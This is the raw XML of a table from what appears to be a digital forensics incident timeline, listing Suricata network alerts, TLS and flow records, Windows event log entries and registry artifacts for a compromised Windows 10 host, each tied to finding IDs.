              <w:t>ET INFO Executable Download from dotted-quad Host | TCP 10.42.85.115:50864 -&gt; 194.61.24.102:80 | Potentially Bad Traffic | 1:joI6Y9tRe9v45mCCcFMHMI7rx+A= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#442</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411571</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-017, F-029, I-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Files transferred (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-017, F-029, I-001, I-009, T-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
              <w:t>ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | TCP 194.61.24.102:80 -&gt; 10.42.85.115:50864 | Potentially Bad Traffic | 1:joI6Y9tRe9v45mCCcFMHMI7rx+A= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#444</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:45.794820</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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 | tls_ja4=t12d1909h2_d83cc789557e_7af1ed941c26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_tls.jsonl#16329</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-029</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:49.936293</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>203.78.103.109</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.115:50875 -&gt; 203.78.103.109:443 failed state=established bytes=280374/1764209</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-015, F-017, F-031, F-032, T-007, T-025, T-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:49.938222</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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 | tls_ja4=t12d1909h2_d83cc789557e_7af1ed941c26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_tls.jsonl#16333</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-029, T-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:50.282950</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10.42.85.115:50875 | A Network Trojan was detected | 1:pcNgXsCjc/vxVdVvPl9FwJBoPrA= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#446</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-017, I-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:20.501601</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 1 | Microsoft-Windows-Kernel-General | The system time was changed | OldTime: 2020-09-19 01:54:39.6645222 | NewTime: 2020-09-19 03:13:20.5000000 | Reason: System time synchronized with the hardware clock.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-030, F-032</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:28.318873</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\svchost.exe</w:t>
              <w:br/>
              <w:t>Security 4616 | Microsoft-Windows-Security-Auditing | The system time was changed | PreviousTime: 2020-09-19 03:13:28.3154393 | NewTime: 2020-09-19 03:13:28.3183014 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39496</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-030, F-032</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.313394</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows NT\CurrentVersion</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | ProductName=Windows 10 Enterprise Evaluation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7190</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.313394</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows NT\CurrentVersion</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | InstallDate=2020-09-18 05:47:03.0000000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7191</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.313394</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows NT\CurrentVersion</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | CurrentBuild=19041</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7196</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.342764</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: last logon</w:t>
              <w:br/>
              <w:t>C:\Users\Admin</w:t>
              <w:br/>
              <w:t>S-1-5-21-41211245-796119838-3940169921-1001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_ProfileList.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:17:00.621295</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4647 | Microsoft-Windows-Security-Auditing | User initiated logoff | LogonId: 0x70C125</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39544</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-021</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:17:00.952531</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\Terminal Server</w:t>
              <w:br/>
              <w:t>Threat Hunting | RDP Connections Status | fDenyTSConnections=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
